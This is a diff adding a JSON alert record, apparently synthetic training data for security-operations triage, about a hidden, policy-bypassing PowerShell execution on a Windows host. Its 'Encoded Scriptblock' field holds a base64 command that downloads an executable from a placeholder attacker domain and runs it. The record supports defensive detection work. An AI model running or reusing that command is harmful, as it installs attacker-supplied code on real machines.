@@ -1,0 +1,17 @@
+{
+  "investigation_notes": {
+    "Alert ID": "SOC-10003",
+    "Start Time": "2026-01-27T22:15:00.000Z",
+    "Alert Name": "Suspicious PowerShell Script Execution",
+    "Source IP": "10.10.50.44",
+    "Endpoint": "GF3456",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Description": "A suspicious PowerShell script was executed on host GF3456 under the SYSTEM account. The command used -ExecutionPolicy Bypass and a hidden window with an encoded payload, and the script was loaded from C:\\Windows\\Temp\\system_maintenance.ps1. The process chain shows powershell.exe initiating with svchost.exe as the parent, indicating obfuscated activity typical of post-exploitation attempts.",
+    "Initiating Process": "powershell.exe",
+    "Parent Process": "svchost.exe",
+    "File Path": "C:\\Windows\\Temp\\system_maintenance.ps1",
+    "Process SHA256": "9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3",
+    "Encoded Scriptblock": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsAZQByAC4AdABvAHAALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAIgA7ACQAcABhAHQAaAAgAD0AIAAiAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAdQBwAGQAYQB0AGUAcgAuAGUAeABlACIAOwAoAE4AZQB3AC8ATwBiAGoAZQBjAHQAIABDAG8AbABsAGUAYwB0AGkAbwBuAHMALgBHAGUAbgBlAHIAaQBjAC4ATABpAHMAdABbAHMAdAByAGkAbgBnAF0AKQAuAEEAZABkACgAIAAiAFsAVwBhAHIAbgBpAG4AZwBdACAAUwB5AHMAdABlAG0AIABVAHAAZABhAHQAZQAgAFIAZQBxAHUAaQByAGUAZAAiACkAOwBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAGUAcgB2AGkAYwBlAFAAbwBpAG4AdABNAGEAbgBhAGcAZQByAF0AOgA6AFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB0AG8AYwBvAGwAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAXQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJAB1AHIAbAAsACAAJABwAGEAdABoACkAOwAmACAAJABwAGEAdABoAA=="
+  },
+  "classification": "HP"
+}
